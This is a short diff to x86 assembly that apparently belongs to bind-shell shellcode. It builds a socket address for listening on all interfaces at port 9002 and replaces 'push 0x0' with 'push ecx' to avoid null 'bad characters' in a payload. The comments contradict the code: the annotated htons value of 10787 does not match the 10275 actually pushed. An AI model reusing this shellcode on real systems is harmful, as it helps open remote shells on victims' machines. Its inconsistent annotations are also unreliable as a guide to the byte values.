@@ -101,7 +101,7 @@ _start:
 	; total size of structure should be 16 
 
 	sub esp, 0x8      ; memset(&(my_addr.sin_zero),'\0',8);
-	push 0x0          ; INADDR_ANY => 0
+	push ecx          ; INADDR_ANY => 0 ; push ecx instead of push 0 to avoid bad characters
 	push word 10275  ; socket.htons(9002) => 10787 => 0x2A23
 	push word 0x2     ; AF_INET => 2
 	
